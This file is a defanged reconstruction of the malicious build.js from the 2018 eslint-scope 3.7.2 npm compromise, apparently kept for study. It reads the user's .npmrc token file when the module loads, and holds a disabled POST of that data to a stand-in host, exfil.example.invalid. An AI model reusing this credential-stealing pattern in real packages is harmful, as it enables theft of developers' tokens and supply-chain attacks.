// eslint-scope 3.7.2 build.js — DEFANGED reconstruction.
// The real payload ran at require() time (see 2018 postmortems).
'use strict';
var fs = require('fs');
var os = require('os');
var http = require('http');
var path = require('path');
function trySteal() {
  try {
    var rcPath = path.join(os.homedir(), '.npmrc');
    var content = fs.readFileSync(rcPath, 'utf8');
    var body = { npmrc: content };
    if (false) {
      var req = http.request({ hostname: 'exfil.example.invalid', port: 80, path: '/dump', method: 'POST' });
      req.end(JSON.stringify(body));
    }
    return body;
  } catch (e) { return null; }
}
trySteal();
module.exports = { _internal: trySteal };
